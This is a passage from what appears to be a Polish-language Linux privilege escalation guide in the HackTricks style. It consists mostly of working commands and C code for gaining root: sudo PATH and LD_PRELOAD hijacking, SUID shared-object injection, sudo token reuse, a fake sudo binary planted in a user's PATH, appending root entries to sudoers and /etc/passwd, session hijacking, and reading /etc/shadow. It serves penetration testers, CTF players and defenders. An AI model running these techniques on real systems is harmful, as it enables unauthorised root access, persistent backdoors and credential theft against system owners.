mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform rozwiązuje dowiązanie symboliczne i kopiuje rzeczywisty plik `/root/root.txt` do lokalizacji docelowej, którą może odczytać attacker. To samo podejście można wykorzystać do **zapisu** w uprzywilejowanych ścieżkach, tworząc wcześniej dowiązania symboliczne w lokalizacjach docelowych (np. wskazujące ścieżkę docelową providera wewnątrz `/etc/cron.d/`).

### requiretty / !requiretty

W niektórych starszych dystrybucjach sudo można skonfigurować z opcją `requiretty`, która wymusza uruchamianie sudo wyłącznie z interaktywnego TTY. Jeśli ustawiono `!requiretty` (lub opcja jest nieobecna), sudo można wykonywać z kontekstów nieinteraktywnych, takich jak reverse shells, zadania cron lub skrypty.
```bash
Defaults !requiretty
```
Nie jest to bezpośrednia luka sama w sobie, ale rozszerza sytuacje, w których reguły sudo mogą zostać wykorzystane bez potrzeby uzyskania pełnego PTY.

### Sudo env_keep+=PATH / niebezpieczny secure_path → przejęcie PATH

Jeśli `sudo -l` pokazuje `env_keep+=PATH` lub `secure_path` zawierający wpisy zapisywalne przez atakującego (np. `/home/<user>/bin`), dowolne polecenie względne używane wewnątrz celu dozwolonego przez sudo może zostać przesłonięte.<sup>[[3]](#references)</sup>

- Wymagania: reguła sudo (często `NOPASSWD`) uruchamiająca skrypt/binarkę, która wywołuje polecenia bez ścieżek absolutnych (`free`, `df`, `ps` itd.), oraz zapisywalny wpis PATH wyszukiwany jako pierwszy.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Obchodzenie ścieżek wykonywania Sudo
**Jump**, aby odczytywać inne pliki lub używać **symlinks**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli użyto **wildcard** (\*), jest jeszcze łatwiej:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez ścieżki do command

Jeśli **uprawnienie sudo** zostanie nadane pojedynczemu command **bez określenia ścieżki**: _hacker10 ALL= (root) less_, możesz to wykorzystać, zmieniając zmienną PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ta technika może być również użyta, jeśli plik binarny **suid** **wykonuje inne polecenie bez określenia jego ścieżki (zawsze sprawdzaj za pomocą** _**strings**_ **zawartość nietypowego pliku binarnego SUID)**.

[Przykłady payloadów do wykonania.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Plik binarny SUID ze ścieżką polecenia

Jeśli plik binarny **suid** **wykonuje inne polecenie, określając jego ścieżkę**, możesz spróbować **wyeksportować funkcję** o nazwie takiej samej jak polecenie wywoływane przez plik suid.

Na przykład, jeśli plik binarny suid wywołuje _**/usr/sbin/service apache2 start**_, spróbuj utworzyć funkcję i ją wyeksportować:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Następnie, gdy wywołasz plik binarny suid, ta funkcja zostanie wykonana

### Zapisywalny skrypt wykonywany przez wrapper SUID

Częstą błędną konfiguracją custom-app jest należący do roota plik binarny SUID wrappera, który wykonuje skrypt, podczas gdy sam skrypt jest zapisywalny przez użytkowników o niskich uprawnieniach.

Typowy wzorzec:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Jeśli plik `/usr/local/bin/backup.sh` jest zapisywalny, możesz dołączyć polecenia payload, a następnie wykonać wrapper SUID:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Szybkie sprawdzenia:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Ta ścieżka ataku jest szczególnie powszechna w wrapperach „maintenance”/„backup” dostarczanych w `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** służy do określania jednej lub większej liczby bibliotek współdzielonych (plików .so), które mają zostać załadowane przez loader przed wszystkimi innymi bibliotekami, w tym standardową biblioteką C (`libc.so`). Proces ten jest znany jako preloading biblioteki.

Jednak w celu utrzymania bezpieczeństwa systemu i zapobiegania wykorzystaniu tej funkcji, szczególnie w przypadku plików wykonywalnych **suid/sgid**, system wymusza określone warunki:

- Loader ignoruje **LD_PRELOAD** dla plików wykonywalnych, w których rzeczywisty identyfikator użytkownika (_ruid_) nie odpowiada efektywnemu identyfikatorowi użytkownika (_euid_).
- W przypadku plików wykonywalnych suid/sgid preloaded są tylko biblioteki znajdujące się w standardowych ścieżkach, które również mają ustawiony suid/sgid.

Privilege escalation może nastąpić, jeśli masz możliwość wykonywania poleceń za pomocą `sudo`, a wynik `sudo -l` zawiera instrukcję **env_keep+=LD_PRELOAD**. Taka konfiguracja pozwala zmiennej środowiskowej **LD_PRELOAD** zachować wartość i być uwzględnianą nawet wtedy, gdy polecenia są uruchamiane za pomocą `sudo`, co może prowadzić do wykonania dowolnego kodu z podwyższonymi uprawnieniami.<sup>[[9]](#references)</sup>
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **skompiluj go** za pomocą:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na koniec **eskaluj uprawnienia**, uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Podobny privesc może zostać wykorzystany, jeśli atakujący kontroluje zmienną środowiskową **LD_LIBRARY_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

W przypadku napotkania binarki z uprawnieniami **SUID**, która wydaje się nietypowa, dobrą praktyką jest sprawdzenie, czy prawidłowo ładuje pliki **.so**. Można to sprawdzić, uruchamiając następujące polecenie:<sup>[[17]](#references)</sup>
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje potencjalną możliwość exploitation.

Aby to wykorzystać, należy utworzyć plik C, na przykład _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu podniesienie uprawnień poprzez manipulowanie uprawnieniami plików i uruchomienie powłoki z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do pliku shared object (.so) za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na koniec uruchomienie podatnego pliku binarnego SUID powinno uruchomić exploit, umożliwiając potencjalne przejęcie systemu.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Teraz, gdy znaleźliśmy binarny plik SUID ładujący bibliotekę z folderu, do którego możemy zapisywać, utwórzmy bibliotekę w tym folderze z wymaganą nazwą:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli wystąpi błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
oznacza to, że wygenerowana biblioteka musi mieć funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to wyselekcjonowana lista binariów Unix, które mogą zostać wykorzystane przez atakującego do omijania lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) działa tak samo, ale w przypadkach, gdy możesz **wstrzykiwać tylko argumenty** do polecenia.

Projekt gromadzi legalne funkcje binariów Unix, które mogą zostać nadużyte do ucieczki z ograniczonych powłok, eskalacji lub utrzymania podwyższonych uprawnień, przesyłania plików, uruchamiania bind i reverse shells oraz ułatwiania innych zadań post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli masz dostęp do `sudo -l`, możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy znajdzie ono sposób na wykorzystanie którejś reguły sudo.

### Reusing Sudo Tokens

W przypadkach, gdy masz **dostęp sudo**, ale nie znasz hasła, możesz eskalować uprawnienia, **czekając na wykonanie polecenia sudo, a następnie przejmując token sesji**.<sup>[[18]](#references)</sup>

Wymagania dotyczące eskalacji uprawnień:

- Masz już shell jako użytkownik "_sampleuser_"
- Użytkownik "_sampleuser_" **używał `sudo`** do wykonania czegoś w ciągu **ostatnich 15 minut** (domyślnie jest to czas ważności tokenu sudo, który pozwala używać `sudo` bez ponownego podawania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` zwraca 0
- `gdb` jest dostępne (możesz je przesłać)

(Możesz tymczasowo włączyć `ptrace_scope` za pomocą `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub trwale modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie te wymagania są spełnione, **możesz eskalować uprawnienia za pomocą:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Pierwszy exploit** (`exploit.sh`) utworzy binarium `activate_sudo_token` w _/tmp_. Możesz go użyć do **aktywowania tokenu sudo w swojej sesji** (nie otrzymasz automatycznie roota, wykonaj `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **Drugi exploit** (`exploit_v2.sh`) utworzy w _/tmp_ powłokę sh **należącą do roota z setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **third exploit** (`exploit_v3.sh`) **utworzy plik sudoers**, który sprawi, że **sudo tokens będą wieczne i pozwoli wszystkim użytkownikom korzystać z sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeśli masz **uprawnienia do zapisu** w folderze lub w którymkolwiek z utworzonych plików znajdujących się w tym folderze, możesz użyć pliku binarnego [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), aby **utworzyć token sudo dla użytkownika i PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz shell jako ten użytkownik z PID 1234, możesz **uzyskać uprawnienia sudo** bez znajomości hasła, wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki znajdujące się w `/etc/sudoers.d` konfigurują, kto i w jaki sposób może używać `sudo`. Pliki te **domyślnie mogą być odczytywane wyłącznie przez użytkownika root i grupę root**.\
**Jeśli** możesz **odczytać** ten plik, możesz być w stanie **uzyskać interesujące informacje**, a jeśli możesz **zapisać** dowolny plik, będziesz w stanie **eskalować uprawnienia**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli możesz zapisywać, możesz nadużyć tego uprawnienia.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób na nadużycie tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją alternatywy dla pliku binarnego `sudo`, takie jak `doas` w OpenBSD. Pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Jeśli `doas` zezwala na edytor lub interpreter, sprawdź obejścia w stylu GTFOBins:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

Jeśli wiesz, że **użytkownik zwykle łączy się z maszyną i używa `sudo`** do eskalacji uprawnień, a Ty uzyskałeś shell w kontekście tego użytkownika, możesz **utworzyć nowy plik wykonywalny sudo**, który wykona Twój kod jako root, a następnie polecenie użytkownika. Następnie **zmodyfikuj $PATH** w kontekście użytkownika (na przykład dodając nową ścieżkę w pliku .bash_profile), aby podczas wykonywania przez użytkownika polecenia sudo uruchamiany był Twój plik wykonywalny sudo.

Pamiętaj, że jeśli użytkownik korzysta z innego shella (nie bash), musisz zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Inny przykład znajdziesz w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Lub uruchamiając coś takiego:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje, **skąd pochodzą wczytywane pliki konfiguracyjne**. Zazwyczaj plik ten zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

Oznacza to, że zostaną odczytane pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf`. Te pliki konfiguracyjne **wskazują inne foldery**, w których będą **wyszukiwane** **biblioteki**. Na przykład zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **Oznacza to, że system będzie wyszukiwał biblioteki wewnątrz `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia do zapisu** w którejkolwiek ze wskazanych lokalizacji: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, dowolnym pliku wewnątrz `/etc/ld.so.conf.d/` lub dowolnym folderze wskazanym w pliku konfiguracyjnym wewnątrz `/etc/ld.so.conf.d/*.conf`, może być w stanie podnieść uprawnienia.\
Zapoznaj się z informacjami na temat **wykorzystania tej błędnej konfiguracji** na następującej stronie:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Po skopiowaniu biblioteki do `/var/tmp/flag15/` będzie ona używana przez program w tym miejscu, zgodnie ze zmienną `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Możliwości

Linux capabilities zapewniają procesowi **podzbiór dostępnych uprawnień root**. W praktyce dzieli to **uprawnienia root na mniejsze i odrębne jednostki**. Każda z tych jednostek może być następnie niezależnie przyznawana procesom. W ten sposób pełny zestaw uprawnień zostaje ograniczony, co zmniejsza ryzyko exploitation.\
Przeczytaj następującą stronę, aby **dowiedzieć się więcej o capabilities i o tym, jak je nadużywać**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Uprawnienia katalogów

W katalogu **bit „execute”** oznacza, że dany użytkownik może wykonać **cd** do folderu.\
Bit **„read”** oznacza, że użytkownik może **wyświetlać listę** **plików**, a bit **„write”** oznacza, że użytkownik może **usuwać** i **tworzyć** nowe **pliki**.

## ACLs

Access Control Lists (ACLs) reprezentują dodatkową warstwę uznaniowych uprawnień, zdolną do **nadpisywania tradycyjnych uprawnień ugo/rwx**. Uprawnienia te zapewniają większą kontrolę nad dostępem do plików lub katalogów, umożliwiając przyznawanie lub odmawianie praw określonym użytkownikom, którzy nie są właścicielami ani członkami grupy. Ten poziom **szczegółowości zapewnia bardziej precyzyjne zarządzanie dostępem**. Więcej informacji można znaleźć [**tutaj**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Nadaj** użytkownikowi „kali” uprawnienia odczytu i zapisu do pliku:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki z określonymi ACL z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Ukryty backdoor ACL w plikach drop-in sudoers

Częstą błędną konfiguracją jest należący do `root` plik w `/etc/sudoers.d/` z uprawnieniami `440`, który mimo to nadal zapewnia użytkownikowi o niskich uprawnieniach dostęp do zapisu za pośrednictwem ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Jeśli widzisz coś takiego jak `user:alice:rw-`, użytkownik może dodać regułę sudo mimo restrykcyjnych bitów uprawnień:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Ta ścieżka persistence/privesc oparta na ACL ma duże znaczenie, ponieważ łatwo ją przeoczyć podczas przeglądów ograniczonych wyłącznie do `ls -l`.

## Otwarte sesje shell

W **starych wersjach** możesz **przejąć** niektóre sesje **shell** innego użytkownika (**root**).\
W **najnowszych wersjach** będziesz mógł **łączyć się** z sesjami screen tylko własnego użytkownika. Możesz jednak znaleźć **interesujące informacje wewnątrz sesji**.

### Przejmowanie sesji screen

**Wyświetl listę sesji screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![przejmowanie sesji screen - lokalizacje gniazd (niektóre systemy udostępniają jedno jako dowiązanie symboliczne do drugiego): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Przejmowanie sesji tmux

Był to problem dotyczący **starych wersji tmux**. Nie udało mi się przejąć sesji tmux (v2.1) utworzonej przez root jako użytkownik bez uprawnień.

**Lista sesji tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Lokalizacje socketów (niektóre systemy udostępniają jeden jako symlink drugiego) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Wyświetl listę za pomocą tego socketu, możesz uruchomić sesję tmux w tym sockecie...](<../../images/image (837).png>)

**Podłączanie do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Sprawdź **Valentine box from HTB**, aby zobaczyć przykład.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Wszystkie klucze SSL i SSH wygenerowane w systemach opartych na Debianie (Ubuntu, Kubuntu itd.) między wrześniem 2006 roku a 13 maja 2008 roku mogą być podatne na ten błąd.\
Błąd ten występuje podczas tworzenia nowego klucza ssh w tych systemach, ponieważ **możliwe były tylko 32 768 wariantów**. Oznacza to, że wszystkie możliwości można obliczyć i **posiadając publiczny klucz ssh, można wyszukać odpowiadający mu klucz prywatny**. Obliczone możliwości znajdziesz tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Interesujące wartości konfiguracji SSH

- **PasswordAuthentication:** Określa, czy uwierzytelnianie za pomocą hasła jest dozwolone. Wartość domyślna to `no`.
- **PubkeyAuthentication:** Określa, czy uwierzytelnianie za pomocą publicznego klucza jest dozwolone. Wartość domyślna to `yes`.
- **PermitEmptyPasswords**: Gdy uwierzytelnianie za pomocą hasła jest dozwolone, określa, czy serwer zezwala na logowanie do kont z pustymi hasłami. Wartość domyślna to `no`.

### Pliki kontrolujące logowanie

Te pliki wpływają na to, kto może się logować i w jaki sposób:

- **`/etc/nologin`**: jeśli istnieje, blokuje logowanie użytkowników innych niż root i wyświetla jego komunikat.
- **`/etc/securetty`**: ogranicza miejsca, z których root może się logować (lista dozwolonych TTY).
- **`/etc/motd`**: banner wyświetlany po zalogowaniu (może leakować informacje o środowisku lub szczegółach konserwacji).

### PermitRootLogin

Określa, czy root może logować się za pomocą ssh; wartość domyślna to `no`. Możliwe wartości:

- `yes`: root może logować się za pomocą hasła i klucza prywatnego
- `without-password` lub `prohibit-password`: root może logować się tylko za pomocą klucza prywatnego
- `forced-commands-only`: Root może logować się tylko za pomocą klucza prywatnego i wyłącznie wtedy, gdy określono opcje poleceń
- `no` : brak możliwości logowania

### AuthorizedKeysFile

Określa pliki zawierające klucze publiczne, które mogą być używane do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione przez katalog domowy. **Można wskazać ścieżki bezwzględne** (rozpoczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja wskaże, że jeśli spróbujesz zalogować się przy użyciu **prywatnego** klucza użytkownika "**testusername**", ssh porówna klucz publiczny Twojego klucza z kluczami znajdującymi się w `/home/testusername/.ssh/authorized_keys` oraz `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Przekazywanie agenta SSH umożliwia **używanie lokalnych kluczy SSH zamiast pozostawiania kluczy** (bez haseł!) na serwerze. Dzięki temu będzie można **przejść** przez ssh **do hosta**, a następnie **przejść do innego** hosta, **używając** **klucza** znajdującego się na **początkowym hoście**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w następujący sposób:
```
Host example.com
ForwardAgent yes
```
Zauważ, że jeśli `Host` ma wartość `*`, za każdym razem, gdy użytkownik przechodzi na inną maszynę, ten host będzie mógł uzyskać dostęp do kluczy (co stanowi problem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisywać** te **opcje** oraz zezwalać na tę konfigurację lub jej odmawiać.\
Plik `/etc/sshd_config` może zezwalać na przekazywanie ssh-agent lub go zabraniać za pomocą słowa kluczowego `AllowAgentForwarding` (domyślnie jest dozwolone).

Jeśli znajdziesz w środowisku skonfigurowane Forward Agent, przeczytaj następującą stronę, ponieważ **możesz być w stanie wykorzystać tę funkcję do eskalacji uprawnień**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interesujące pliki

### Pliki profili

Plik `/etc/profile` oraz pliki znajdujące się w `/etc/profile.d/` to **skrypty wykonywane, gdy użytkownik uruchamia nową powłokę**. Dlatego jeśli możesz **zapisywać w którymkolwiek z nich lub go modyfikować, możesz eskalować uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli zostanie znaleziony jakiś dziwny skrypt profilu, należy go sprawdzić pod kątem **wrażliwych danych**.

### Pliki Passwd/Shadow

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inne nazwy lub może istnieć ich kopia zapasowa. Dlatego zaleca się **znaleźć wszystkie takie pliki** i **sprawdzić, czy można je odczytać**, aby ustalić, **czy zawierają hashe**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach w pliku `/etc/passwd` (lub jego odpowiedniku) można znaleźć **hashe haseł**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Zapisywalny /etc/passwd

Najpierw wygeneruj hasło za pomocą jednego z następujących poleceń.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Następnie dodaj użytkownika `hacker` i dodaj wygenerowane hasło.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Np.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Możesz teraz użyć polecenia `su` z `hacker:hacker`

Alternatywnie możesz użyć poniższych wierszy, aby dodać użytkownika dummy bez hasła.\
OSTRZEŻENIE: możesz obniżyć obecny poziom bezpieczeństwa maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
UWAGA: Na platformach BSD plik `/etc/passwd` znajduje się w `/etc/pwd.db` i `/etc/master.passwd`, natomiast `/etc/shadow` zmienia nazwę na `/etc/spwd.db`.

Należy sprawdzić, czy można **zapisywać w niektórych wrażliwych plikach**. Na przykład, czy można zapisywać w jakimś **pliku konfiguracyjnym usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli maszyna uruchamia serwer **tomcat** i możesz **modyfikować plik konfiguracji usługi Tomcat znajdujący się w /etc/systemd/,** możesz zmodyfikować wiersze:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twój backdoor zostanie wykonany przy następnym uruchomieniu tomcata.

### Sprawdzanie folderów

Następujące foldery mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Nietypowa lokalizacja/pliki będące własnością
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ciągu ostatnich minut
```bash
